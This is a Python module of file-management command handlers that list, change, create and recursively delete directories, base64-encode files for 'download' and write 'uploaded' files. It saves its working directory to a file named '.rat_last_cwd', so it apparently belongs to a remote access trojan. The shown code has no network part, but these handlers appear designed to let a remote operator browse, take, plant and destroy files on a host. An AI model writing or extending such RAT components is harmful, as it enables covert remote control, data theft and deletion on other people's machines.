
import base64
import logging
import os
import shutil

CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")

def list_directory(path: str = ".") -> str:
    """Lists the contents of a directory."""
    try:
        if not os.path.isdir(path):
            return f"Error: Directory not found at '{path}'"
        entries = os.listdir(path)
        output = [f"Contents of {os.path.abspath(path)}:"]
        for entry in sorted(entries):
            full_path = os.path.join(path, entry)
            prefix = "[DIR] " if os.path.isdir(full_path) else "      "
            output.append(f"{prefix} {entry}")
        return "\n".join(output)
    except Exception as e:
        return f"Error listing directory: {e}"

def change_directory(path: str) -> str:
    """Changes the current working directory."""
    try:
        os.chdir(path)
        cwd = os.getcwd()
        with open(CD_STATE_FILE, "w", encoding="utf-8") as f:
            f.write(cwd)
        return f"Changed directory to: {cwd}"
    except FileNotFoundError:
        return f"Error: Directory not found at '{path}'"
    except Exception as e:
        return f"Error changing directory: {e}"

def remove_path(path: str) -> str:
    """Removes a file or directory."""
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"File '{path}' deleted."
        elif os.path.isdir(path):
            shutil.rmtree(path)
            return f"Directory '{path}' and its contents deleted."
        else:
            return f"Error: Path '{path}' not found."
    except Exception as e:
        return f"Error deleting '{path}': {e}"

def make_directory(path: str) -> str:
    """Creates a new directory."""
    try:
        os.makedirs(path, exist_ok=True)
        return f"Directory '{path}' created."
    except Exception as e:
        return f"Error creating directory '{path}': {e}"

def download_file(path: str) -> dict:
    """Reads a file and prepares it for download."""
    if os.path.isfile(path):
        with open(path, "rb") as f:
            file_data = base64.b64encode(f.read()).decode("utf-8")
        return {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
    else:
        return {"type": "command_output", "output": "Error: File not found."}

def upload_file(filename: str, data: str):
    """Saves an uploaded file."""
    with open(filename, "wb") as f:
        f.write(base64.b64decode(data))
    return f"File saved: {filename}"

def load_cwd_state():
    """Loads the last working directory on startup."""
    try:
        if os.path.exists(CD_STATE_FILE):
            with open(CD_STATE_FILE, "r", encoding="utf-8") as f:
                path = f.read().strip()
            if os.path.isdir(path):
                os.chdir(path)
    except Exception as e:
        logging.warning(f"Could not restore working directory: {e}")
